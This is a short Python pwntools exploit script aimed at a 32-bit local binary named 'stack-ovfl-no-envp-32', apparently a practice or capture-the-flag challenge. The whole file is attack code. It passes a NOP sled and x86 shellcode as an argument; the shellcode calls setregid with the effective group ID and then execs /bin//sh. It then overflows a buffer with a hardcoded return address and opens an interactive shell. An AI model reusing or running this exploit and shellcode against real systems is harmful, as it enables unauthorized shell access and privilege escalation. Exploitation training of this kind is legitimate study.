#!/usr/bin/env python

from pwn import *
import os

context.terminal = ["tmux", "splitw", "-h"]
p = process(['./stack-ovfl-no-envp-32', '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'])
#gdb.attach(p)

buf = "A" * 0x10 + p32(0xffffc828)

p.sendline(buf)
p.interactive()
